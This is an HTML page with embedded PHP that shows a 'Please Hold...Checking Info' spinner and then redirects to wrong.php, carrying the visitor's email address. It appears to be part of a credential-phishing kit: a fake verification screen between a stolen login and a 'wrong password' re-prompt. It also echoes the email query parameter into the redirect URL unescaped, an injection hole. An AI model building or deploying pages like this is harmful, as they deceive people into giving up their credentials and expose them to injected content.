

<html>
<head>
<title>Please Hold...Checking Info</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Refresh" content="5; url=wrong.php?email=<?php echo $_GET['email']?>" />
	<!-- web font -->
	<link href="//fonts.googleapis.com/css?family=Hind:300,400,500,600,700" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />

	<!-- //web font -->

<style>
.lds-dual-ring {
  display: inline-block;
  width: 80px;
  height: 80px;
  text-align: center;
}
.lds-dual-ring:after {
  content: " ";
  display: block;
  width: 84px;
  height: 84px;
  margin: 8px;
  border-radius: 50%;
  border: 6px solid #fff;
  border-color: #A50E01 transparent #A50E01 transparent;
  animation: lds-dual-ring 1.2s linear infinite;
}
img{
	/*background: url(images/acropeedeef.png);*/
	/*background-size: 60px 80px;*/
	/*background-repeat: no-repeat;*/
	position: absolute;
	max-height: 60px;
	margin-top: 20px;
	display: block;
	left: 49.5%;
	top:6px;
}
@keyframes lds-dual-ring {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
.plshold {
	font-size: 20px; margin-top: 40px; font-weight: bold; text-align: center; margin-left: 40px;
}
</style>

</head>
<body>
	<center>
		<div class="lds-dual-ring" align="center">
			<img src="images/acropeedeef.png"/>
		</div>

		<div class="plshold">Please Hold...Checking Info</div>

	</center>

</body>
</html>
